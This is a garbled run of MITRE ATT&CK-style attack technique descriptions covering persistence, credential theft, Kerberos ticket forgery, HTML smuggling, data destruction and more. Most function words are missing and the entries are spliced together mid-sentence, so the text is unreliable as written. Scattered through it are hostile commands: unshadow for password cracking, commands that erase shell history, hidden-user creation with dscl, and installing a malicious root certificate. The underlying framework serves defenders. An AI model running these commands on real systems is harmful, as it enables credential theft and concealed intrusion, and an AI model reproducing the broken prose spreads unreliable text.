In addition purchasing capabilities, adversaries steal capabilities third-party entities (including adversaries). include stealing software licenses, malware, SSL/TLS code-signing certificates, raiding closed databases vulnerabilities exploits.(Citation: DiginotarCompromise) Adversaries establish persistence executing malicious content triggered user inactivity. Screensavers programs execute configurable time user inactivity consist Portable Executable (PE) files .scr file extension.(Citation: Wikipedia Screensaver) Windows screensaver application scrnsave.scr located <code>C:\Windows\System32\</code>, <code>C:\Windows\sysWOW64\</code>  64-bit Windows systems, screensavers included base Windows installations.

The screensaver settings stored Registry (<code>HKCU\Control Panel\Desktop\</code>) manipulated achieve persistence:

* <code>SCRNSAVE.exe</code> - set malicious path
* <code>ScreenSaveActive</code> - set '1' enable screensaver
* <code>ScreenSaverIsSecure</code> - set '0' require password unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout screensaver executed

Adversaries screensaver settings maintain persistence setting screensaver malware timeframe user inactivity.(Citation: ESET Gazer Aug 2017) user account macOS userID it. creating user, userID account. property <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> prevents users userIDs 500 appearing login screen. [Create Account](https://attack.mitre.org/techniques/T1136) technique userID 500 enabling property (setting Yes), adversary hide user accounts easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> (Citation: Cybereason OSX Pirrit). adversary create instance virtual machine (VM) compute service cloud account evade defenses. Creating instance adversary bypass firewall rules permissions exist instances residing account. adversary [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) volumes account, create instance, mount snapshots, apply restrictive security policy collect [Data Local System](https://attack.mitre.org/techniques/T1005) [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)

Creating instance adversary carry malicious activity environment execution current running instances. Adversaries attempt payloads difficult discover analyze delivering files victims uncompiled code. [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027), text-based source code files subvert analysis scrutiny protections targeting executables/binaries. payloads compiled execution; typically native utilities csc.exe GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads encrypted, encoded, embedded files, delivered [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads delivered formats unrecognizable inherently benign native OS (ex: EXEs macOS/Linux) (re)compiled proper executable binary bundled compiler execution framework.(Citation: TrendMicro WindowsAppMac)
 Adversaries leverage code repositories collect valuable information. Code repositories tools/services store source code automate software builds. hosted internally privately party sites Github, GitLab, SourceForge, BitBucket. Users typically interact code repositories application command-line utilities git.

Once adversaries gain access victim network private code repository, collect sensitive proprietary source code credentials contained software's source code.  access software's source code adversaries develop [Exploits](https://attack.mitre.org/techniques/T1587/004), credentials provide access additional resources [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)

**Note:** distinct [Code Repositories](https://attack.mitre.org/techniques/T1593/003), focuses conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) public code repositories. Adversaries alter data en route storage systems manipulate external outcomes hide activity, threatening integrity data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) manipulating transmitted data, adversaries attempt affect business process, organizational understanding, decision making.

Manipulation network connection processes opportunity deploy tool intercept change information. type modification impact depends target transmission mechanism goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries attempt dump contents <code>/etc/passwd</code> <code>/etc/shadow</code> enable offline password cracking. modern Linux operating systems combination <code>/etc/passwd</code> <code>/etc/shadow</code> store user account including password hashes <code>/etc/shadow</code>. default, <code>/etc/shadow</code> readable root user.(Citation: Linux Password Shadow File Formats)

The Linux utility, unshadow, combine files format suited password cracking utilities John Ripper:(Citation: nixCraft - John Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>
 Adversaries create modify launch agents repeatedly execute malicious payloads persistence. user logs in, per-user launchd process started loads parameters launch-on-demand user agent property list (.plist) file <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files <code>Label</code>, <code>ProgramArguments </code>, <code>RunAtLoad</code> identify Launch Agent's name, executable location, execution time.(Citation: OSX.Dok Malware) Launch Agents installed perform updates programs, launch user programs login, conduct developer tasks.

 Launch Agents executed [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.
 
Adversaries install Launch Agent executes login placing .plist file folders <code>RunAtLoad</code> <code>KeepAlive</code> set <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods Mac Malware Persistence) Launch Agent disguised operating benign software. Launch Agents created user level privileges execute user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus OS X)  Adversaries abuse services daemons execute commands programs. Adversaries execute malicious content interacting creating services locally remotely. services set boot, aid achieving persistence ([Create Modify Process](https://attack.mitre.org/techniques/T1543)), adversaries abuse services one-time temporary execution. Adversaries abuse Windows command execution. Windows command ([cmd](https://attack.mitre.org/software/S0106)) primary command prompt Windows systems. Windows command prompt control aspect system, permission levels required subsets commands. command prompt invoked remotely [Remote Services](https://attack.mitre.org/techniques/T1021) [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH Windows)

Batch files (ex: .bat .cmd) provide list sequential commands run, normal scripting operations conditionals loops. Common batch files include repetitive tasks, set commands multiple systems.

Adversaries leverage [cmd](https://attack.mitre.org/software/S0106) execute commands payloads. Common include [cmd](https://attack.mitre.org/software/S0106) execute single command, abusing [cmd](https://attack.mitre.org/software/S0106) interactively input output forwarded command control channel. Adversaries inject malicious code processes /proc filesystem evade process-based defenses elevate privileges. Proc memory injection method executing arbitrary code address space separate live process. 

Proc memory injection involves enumerating memory process /proc filesystem (<code>/proc/[pid]</code>) crafting return-oriented programming (ROP) payload gadgets/instructions. running process directory, includes memory mappings. Proc memory injection commonly performed overwriting target processes’ stack memory mappings /proc filesystem. enumerate offsets (including stack) gadgets (or instructions program build malicious payload) hidden process memory protections address space layout randomization (ASLR). enumerated, target processes’ memory map <code>/proc/[pid]/maps</code> overwritten dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) 

Other techniques [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) populate target process gadgets. [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection target child processes (such backgrounded sleep).(Citation: GDS Linux Injection) 

Running code context process access process's memory, system/network resources, elevated privileges. Execution proc memory injection evade detection security products execution masked legitimate process.  Compiled files (.chm) commonly distributed system. CHM files compressed compilations content documents, images, scripting/web programming languages VBA, JScript, Java, ActiveX. (Citation: 2018) CHM content displayed underlying components Internet Explorer browser (Citation: ActiveX) loaded executable program (hh.exe). (Citation: Executable Program)

Adversaries abuse technology conceal malicious code. custom CHM file embedded payloads delivered victim triggered [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution bypass application whitelisting unpatched systems account execution binaries hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: CVE-2017-8625 Aug 2017) Adversaries modify operating network device introduce capabilities weaken existing defenses.(Citation: Killing myth Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen Dead) network devices built monolithic architecture, entire operating functionality device contained single file.  Adversaries change file storage, loaded future boot, memory runtime.

To change operating storage, adversary typically standard procedures device operators. involve downloading file typical protocols network devices, TFTP, FTP, SCP, console connection.  original file overwritten, file written device reconfigured boot compromised image.

To change operating memory, adversary typically methods. first, adversary native debug commands original, unaltered running operating modify relevant memory addresses running operating system.  method typically requires administrative level access device.

In method changing operating memory, adversary boot loader. boot loader piece software loads device starts that, turn, launch operating system.  Adversaries malicious code implanted boot loader, [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, manipulate running operating code memory.  malicious code bootloader capability direct memory manipulation adversary, allowing patch live operating runtime.

By modifying instructions stored image file, adversaries weaken existing defenses provision capabilities device before. Examples existing defenses impeded include encryption, [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), perimeter defenses, [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding capabilities adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), [Port Knocking](https://attack.mitre.org/techniques/T1205/001).

Adversaries compromise existing commands operating produce false output mislead defenders.   method conjunction [Downgrade Image](https://attack.mitre.org/techniques/T1601/002), compromised command include changing output command version running operating system.  patching operating system, adversary change command display original, revision replaced downgrade. 

When operating patched storage, achieved resident storage (typically form flash memory, non-volatile) [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). 

When technique performed running operating memory stored copy, technique survive reboots.  However, live memory modification operating combined [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) achieve persistence.  Adversaries password hash target service account (e.g. SharePoint, MSSQL) forge Kerberos ticket granting service (TGS) tickets, silver tickets. Kerberos TGS tickets service tickets.(Citation: ADSecurity Silver Tickets)

Silver tickets limited scope golden tickets enable adversaries access resource (e.g. MSSQL) hosts resource; however, golden tickets, adversaries ability forge silver tickets create TGS tickets interacting Key Distribution Center (KDC), detection difficult.(Citation: ADSecurity Detecting Forged Tickets)

Password hashes target services [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) [Kerberoasting](https://attack.mitre.org/techniques/T1558/003). Adversaries leverage repositories valuable information. repositories tools storage information, typically facilitate collaboration sharing users, store wide variety data aid adversaries objectives, direct access target information. Adversaries abuse external sharing features share sensitive documents recipients organization. 

The list hold potential adversary repository:

* Policies, procedures, standards
* Physical / logical network diagrams
* architecture diagrams
* Technical documentation
* Testing / development credentials
* / project schedules
* Source code snippets
* Links network shares internal resources

Information stored repository vary based specific instance environment. Specific common repositories include web-based platforms [Sharepoint](https://attack.mitre.org/techniques/T1213/002) [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services Code Repositories, IaaS databases, enterprise databases, storage infrastructure SQL Server. Adversaries artifacts established persistence host remove evidence activity. involve actions, removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), methods cleanup prevent defenders collecting evidence persistent presence.(Citation: Cylance Dust Storm)

In instances, artifacts persistence removed adversary’s persistence executed prevent errors instance malware.(Citation: NCC Team9 June 2020) addition clearing logs, adversary command history compromised account conceal actions undertaken intrusion. macOS Linux track commands users type terminal users retrace done. logs accessed ways. logged in, command history tracked file environment variable <code>HISTFILE</code>. user logs system, flushed file user's directory called <code>~/.bash_history</code>. benefit users commands sessions. typed command-line saved, passwords passed command saved. Adversaries abuse searching files cleartext passwords. Additionally, adversaries variety methods prevent commands logs <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>. Adversaries acquire credentials Windows Credential Manager. Credential Manager stores credentials signing websites, applications, devices request authentication NTLM Kerberos Credential Lockers (previously Windows Vaults).(Citation: Credential Manager store)(Citation: Credential Locker)

The Windows Credential Manager separates credentials application network credentials lockers. [Credentials Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer Edge credentials managed Credential Manager stored Credentials locker. Application network credentials stored Windows Credentials locker.

Credential Lockers store credentials encrypted `.vcrd` files, located `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. encryption key file named <code>Policy.vpol</code>, typically located folder credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes Windows Vault)

Adversaries list credentials managed Windows Credential Manager mechanisms. <code>vaultcmd.exe</code> native Windows executable enumerate credentials stored Credential Locker command-line interface. Adversaries gather credentials reading files located Credential Lockers. Windows APIs, <code>CredEnumerateA</code>, absued list credentials managed Credential Manager.(Citation: CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

Adversaries credentials credential backups. Credential backups restorations performed running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> selecting “Back up...” button “Stored User Names Passwords” GUI.

Password recovery tools plain passwords Credential Manager.(Citation: Malwarebytes Windows Vault) Adversaries Event Monitor Daemon (emond) establish persistence scheduling malicious commands predictable event triggers. Emond [Launch Daemon](https://attack.mitre.org/techniques/T1160) accepts events services, runs simple rules engine, takes action. emond binary <code>/sbin/emond</code> load rules <code>/etc/emond.d/rules/</code> directory action explicitly defined event takes place. rule files plist format define name, event type, action take. examples event types include startup user authentication. Examples actions command send email. emond service launch file QueueDirectories path <code>/private/var/db/emondClients</code>, [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

Adversaries abuse service writing rule execute commands defined event occurs, start user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries escalate privileges administrator root emond service executed root privileges [Launch Daemon](https://attack.mitre.org/techniques/T1160) service. Spearphishing service specific variant spearphishing. forms spearphishing employs party services enterprise email channels. 

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, adversaries send messages social media services, personal webmail, non-enterprise controlled services. services less-strict security policy enterprise. kinds spearphishing, goal generate rapport target target's way. Adversaries create fake social media accounts message employees potential job opportunities. plausible reason services, policies, software running environment. adversary send malicious links attachments services.

A common build rapport target social media, send content personal webmail service target computer. adversary bypass email restrictions account, target file expecting. payload expected, adversary continue normal communications troubleshoot target working. Adversaries introduce accessories, networking hardware, computing devices network vector gain access. connecting distributing payloads removable storage [Replication Removable Media](https://attack.mitre.org/techniques/T1091)), robust hardware additions introduce functionalities features abused.

While public references usage threat actors scarce, red teams/penetration testers leverage hardware additions initial access. Commercial source products leveraged capabilities passive network tapping, network traffic modification [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading DMA, addition wireless access existing network, others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012) Adversaries abuse legitimate extensible development features servers establish persistent access systems. Enterprise server applications include features developers write install software scripts extend functionality main application. Adversaries install malicious components extend abuse server applications.(Citation: volexity_0day_sophos_FW) Adversaries destroy data files specific systems network interrupt availability systems, services, network resources. Data destruction render stored data irrecoverable forensic techniques overwriting files data local remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating file deletion commands <code>del</code> <code>rm</code> remove pointers files wiping contents files themselves, files recoverable proper forensic methodology. behavior distinct [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) individual files destroyed sections storage disk disk's logical structure.

Adversaries attempt overwrite files directories randomly generated data irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) politically oriented image files overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

To maximize impact target organization operations network-wide availability interruption goal, malware designed destroying data worm-like features propagate network leveraging additional techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).

In cloud environments, adversaries leverage access delete cloud storage, cloud storage accounts, machine images, infrastructure crucial operations damage organization customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Adversaries encode data non-standard data encoding content command control traffic difficult detect. Command control (C2) encoded non-standard data encoding diverges existing protocol specifications. Non-standard data encoding schemes based standard data encoding schemes, modified Base64 encoding message body request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)  Adversaries patch authentication process domain controller bypass typical authentication mechanisms enable access accounts. 

Malware inject false credentials authentication process domain controller intent creating backdoor access user’s account credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key patch enterprise domain controller authentication process (LSASS) credentials adversaries bypass standard authentication system. patched, adversary injected password authenticate domain user account (until skeleton key erased memory reboot domain controller). Authenticated access enable unfettered access hosts resources single-factor authentication environments.(Citation: Dell Skeleton) Adversaries exfiltrate data transferring data, including backups cloud environments, cloud account control service avoid typical file transfers/downloads network-based exfiltration detection.

A defender monitoring transfers cloud environment normal file transfers command control channels watching data transfers account cloud provider. transfers utilize existing cloud provider APIs internal address space cloud provider blend normal traffic avoid data transfers external network interfaces.

Incidents observed adversaries created backups cloud instances transferred separate accounts.(Citation: DOJ GRU Indictment Jul 2018)  Adversaries smuggle data files content filters hiding malicious payloads seemingly benign files. documents store binary objects JavaScript Blobs (immutable data represents raw bytes) constructed file-like objects. Data stored Data URLs, enable embedding media type MIME files inline documents. HTML5 introduced download attribute initiate file downloads.(Citation: Smuggling Menlo Security 2020)(Citation: Outlflank Smuggling 2018)

Adversaries deliver payloads victims bypass security controls Smuggling abusing JavaScript Blobs HTML5 download attributes. Security controls content filters identify smuggled malicious files HTML/JS files, content based typically benign MIME types <code>text/plain</code> <code>text/html</code>. Malicious files data obfuscated hidden files Data URLs JavaScript Blobs deobfuscated reach victim [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140)), bypassing content filters.

For example, JavaScript Blobs abused dynamically generate malicious files victim machine dropped disk abusing JavaScript functions <code>msSaveBlob</code>.(Citation: Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM 2021)(Citation: Outlflank Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017) adversary abuse Active Directory authentication encryption properties gain access credentials Windows systems. <code>AllowReversiblePasswordEncryption</code> property specifies reversible password encryption account enabled disabled. default property disabled (instead storing user credentials output one-way hashing functions) enabled legacy software require it.(Citation: store_pwd_rev_enc)

If property enabled user password enabled, adversary plaintext passwords created/changed property enabled. decrypt passwords, adversary components:

1. Encrypted password (<code>G$RADIUSCHAP</code>) Active Directory user-structure <code>userParameters</code>
2. 16 byte randomly-generated (<code>G$RADIUSCHAPKEY</code>) <code>userParameters</code>
3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
4. Static key hardcoded Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

With information, adversary reproduce encryption key subsequently decrypt encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

An adversary set property scopes Local Policy Editor, user properties, Fine-Grained Password Policy (FGPP), ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. example, adversary implement apply FGPP users Domain Functional Level set "Windows Server 2008" higher.(Citation: dump_pwd_dcsync) PowerShell, adversary user settings commands <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>. Root certificates public key cryptography identify root certificate authority (CA). root certificate installed, application trust certificates root's chain trust signed root certificate. (Citation: Wikipedia Root Certificate) Certificates commonly establishing secure TLS/SSL communications browser. user attempts browse certificate trusted error message displayed warn user security risk. Depending security settings, browser user establish connection website.

Installation root certificate compromised adversary degrade security system. Adversaries technique avoid security warnings prompting users compromised systems connect HTTPS adversary controlled servers spoof legitimate websites collect login credentials. (Citation: Operation Emmental)

Atypical root certificates pre-installed systems manufacturer software supply chain conjunction malware/adware provide man-in-the-middle capability intercepting transmitted secure TLS/SSL communications. (Citation: Kaspersky Superfish)

Root certificates (and chains) cloned reinstalled. Cloned certificate chains carry metadata characteristics source sign malicious code bypass signature validation tools (ex: Sysinternals, antivirus, etc.) block execution uncover artifacts Persistence. (Citation: SpectorOps Code Signing Dec 2017)

In macOS, Ay MaMi malware <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> install malicious certificate trusted root certificate keychain. (Citation: objective-see ay mami 2018) Data encrypted exfiltrated hide exfiltrated detection exfiltration conspicuous inspection defender. encryption performed utility, programming library, custom algorithm data considered separate encryption performed command control file transfer protocol. Common file archive formats encrypt files RAR zip.

Other exfiltration techniques apply transfer network, [Exfiltration C2 Channel](https://attack.mitre.org/techniques/T1041) [Exfiltration Alternative Protocol](https://attack.mitre.org/techniques/T1048) Adversaries delete files left actions intrusion activity. Malware, tools, non-native files dropped created adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) leave traces network how. Removal files occur intrusion, post-intrusion process minimize adversary's footprint.

There tools host operating perform cleanup, adversaries tools well.(Citation: SDelete July 2016) Examples built-in [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> Windows <code>rm</code> <code>unlink</code> Linux macOS. Adversaries gain access user visiting normal browsing. technique, user's browser typically targeted exploitation, adversaries compromised websites non-exploitation behavior acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).

Multiple delivering exploit code browser exist, including:

* legitimate compromised adversaries injected form malicious code JavaScript, iFrames, cross-site scripting.
* Malicious ads paid served legitimate providers.
* Built-in application interfaces leveraged insertion object display content script executes visiting client (e.g. forum posts, comments, user controllable content).

Often adversary visited specific community, government, industry, region, goal compromise specific user set users based shared interest. targeted campaign referred strategic compromise watering hole attack. examples occurring.(Citation: Shadowserver Strategic Compromise)

Typical drive-by compromise process:

1. user visits host adversary controlled content.
2. Scripts automatically execute, typically searching versions browser plugins vulnerable version. 
    * user required assist process enabling scripting active components ignoring warning dialog boxes.
3. finding vulnerable version, exploit code delivered browser.
4. exploitation successful, adversary code execution user's protections place.
    * visit initial scan required exploit code delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), focus technique exploit software client endpoint visiting website. commonly adversary access systems internal network external systems DMZ.

Adversaries compromised websites deliver user malicious application designed [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, OAuth tokens, gain access protected applications information. malicious applications delivered popups legitimate websites.(Citation: Volexity OceanLotus Nov 2017) Adversaries perform Network Denial Service (DoS) attacks degrade block availability targeted resources users. Network DoS performed exhausting network bandwidth services rely on. resources include specific websites, email services, DNS, web-based applications. Adversaries observed conducting network DoS attacks political purposes(Citation: FireEye OpPoisonedHandover February 2016) support malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, extortion.(Citation: Symantec DDoS October 2014)

A Network DoS occur bandwidth capacity network connection exhausted volume malicious traffic directed resource network connections network devices resource relies on. example, adversary send 10Gbps traffic server hosted network 1Gbps connection internet. traffic generated single multiple systems spread internet, commonly referred distributed DoS (DDoS).

To perform Network DoS attacks aspects apply multiple methods, including IP address spoofing, botnets.

Adversaries original IP address attacking system, spoof source IP address attack traffic difficult trace attacking enable reflection. increase difficulty defenders defending attack reducing eliminating effectiveness filtering source address network defense devices.

For DoS attacks targeting hosting directly, [Endpoint Denial Service](https://attack.mitre.org/techniques/T1499). Adversaries establish persistence elevate privileges installer trigger execution malicious content. Installer packages OS specific resources operating install applications system. Installer packages include scripts prior installation installation complete. Installer scripts inherit elevated permissions executed. Developers scripts prepare environment installation, check requirements, download dependencies, remove files installation.(Citation: Installer Package Scripting Rich Trouton)

Using legitimate applications, adversaries distributed applications modified installer scripts execute malicious content. user installs application, required grant administrative permissions installation. installation process legitimate application, content macOS `postinstall` scripts executed inherited elevated permissions. Adversaries scripts execute malicious executable install malicious components (such [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)

Depending distribution, Linux versions package installer scripts called maintainer scripts post installation scripts. scripts include `preinst`, `postinst`, `prerm`, `postrm` scripts root executed.

For Windows, Installer services `.msi` files manage installing, updating, uninstalling applications. Adversaries leveraged `Prebuild` `Postbuild` events commands build installing .msi files.(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts) Adversaries scan victim IP blocks gather targeting. Public IP addresses allocated organizations block, range sequential addresses.

Adversaries scan IP blocks [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), IP addresses actively detailed hosts assigned addresses. Scans range simple pings (ICMP requests responses) nuanced scans reveal host software/versions server banners network artifacts.(Citation: Botnet Scan) scans reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)). prevent normal users accidentally changing special files system, operating systems concept ‘hidden’ file. files don’t user browses file GUI normal commands command line. Users explicitly hidden files series Graphical User Interface (GUI) prompts command switches (<code>dir /a</code> Windows <code>ls –a</code> Linux macOS).

Adversaries advantage hide files folders persistence evading typical user analysis incorporate investigation hidden files.

### Windows

Users mark specific files hidden attrib.exe binary. Simply <code>attrib +h filename</code> mark file folder hidden. Similarly, “+s” marks file file “+r” flag marks file read only. windows binaries, attrib.exe binary ability apply recursively “/S”.

### Linux/Mac

Users mark specific files hidden simply putting “.” character file folder  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files folder start period, ‘.’, default hidden viewed Finder application standard command-line utilities “ls”. Users change settings files viewable. command usages, typically flag files (including hidden ones). view files Finder Application, command executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, relaunch Finder Application.

### Mac

Files macOS marked UF_HIDDEN flag prevents Finder.app, Terminal.app (Citation: WireLurker).
Many applications create hidden files folders store doesn’t clutter user’s workspace. example, SSH utilities create .ssh folder that’s hidden user’s hosts keys. Adversaries create modify references user document templates conceal malicious code force authentication attempts. example, Microsoft’s Office XML (OOXML) specification defines XML-based format Office documents (.docx, xlsx, .pptx) replace binary formats (.doc, .xls, .ppt). OOXML files packed ZIP archives compromised XML files, referred parts, properties collectively define document rendered.(Citation: XML July 2017)

Properties reference shared public resources accessed online URLs. example, template properties reference file, serving pre-formatted document blueprint, fetched document loaded.

Adversaries abuse templates initially conceal malicious code executed user documents. Template references injected document enable malicious payloads fetched executed document loaded.(Citation: SANS Brian Wiltse Template Injection) documents delivered techniques [Phishing](https://attack.mitre.org/techniques/T1566) [Taint Shared Content](https://attack.mitre.org/techniques/T1080) evade static detections typical indicators (VBA macro, script, etc.) malicious payload fetched.(Citation: Redxorblue Remote Template Injection) Examples wild template injection load malicious code exploit.(Citation: MalwareBytes Template Injection OCT 2017)

Adversaries modify <code>*\template</code> control word .rtf file conceal download malicious code. legitimate control word intended file destination template file resource retrieved loaded .rtf file opened. However, adversaries alter bytes existing .rtf file insert template control word field include URL resource malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)

This technique enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) injecting SMB/HTTPS (or credential prompting) URL triggering authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016) Adversaries establish persistence modifying RC scripts executed Unix-like system’s startup. files administrators map start custom services startup levels. RC scripts require root privileges modify.

Adversaries establish persistence adding malicious binary path commands <code>rc.local</code>, <code>rc.common</code>, RC scripts specific Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) reboot, executes script's contents root, persistence.

Adversary abuse RC scripts effective lightweight Unix-like distributions root user default, IoT embedded systems.(Citation: intezer-kaiji-malware)

Several Unix-like systems moved Systemd deprecated RC scripts. deprecated mechanism macOS favor [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) technique Mac OS Panther v10.3 earlier versions execute RC scripts.(Citation: Methods Mac Malware Persistence) maintain compatibility systems, Ubuntu, execute RC scripts exist correct file permissions.(Citation: Ubuntu Manpage systemd rc) Adversaries modify access tokens operate user security context perform actions bypass access controls. Windows access tokens determine ownership running process. user manipulate access tokens running process child process belongs user started process. occurs, process takes security context token.

An adversary built-in Windows API functions access tokens existing processes; token stealing. token applied existing process [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) spawn process [Create Process Token](https://attack.mitre.org/techniques/T1134/002)). adversary privileged user context administrator) steal token. However, adversaries commonly token stealing elevate security context administrator level level. adversary token authenticate remote account token account permissions remote system.(Citation: Pentestlab Token Manipulation)

Any standard user <code>runas</code> command, Windows API functions, create impersonation tokens; require access administrator account. mechanisms, Active Directory fields, modify access tokens. Windows Time service (W32Time) enables time synchronization domains. (Citation: W32Time Feb 2018) W32Time time providers responsible retrieving time stamps hardware/network resources outputting values network clients. (Citation: TimeProvider)

Time providers implemented dynamic-link libraries (DLLs) registered subkeys  <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>. (Citation: TimeProvider) time provider manager, directed service control manager, loads starts time providers listed enabled key startup parameters changed. (Citation: TimeProvider)

Adversaries abuse architecture establish Persistence, registering enabling malicious DLL time provider. Administrator privileges required time provider registration, execution context Local Service account. (Citation: Github W32Time Oct 2017) Adversaries target multi-factor authentication (MFA) mechanisms, (I.e., smart cards, token generators, etc.) gain access credentials access systems, services, network resources. MFA recommended level security user names passwords alone, organizations aware techniques intercept bypass security mechanisms. 

If smart card multi-factor authentication, keylogger password smart card normal use. inserted card access smart card password, adversary connect network resource infected proxy authentication inserted hardware token. (Citation: Mandiant Trends 2011)

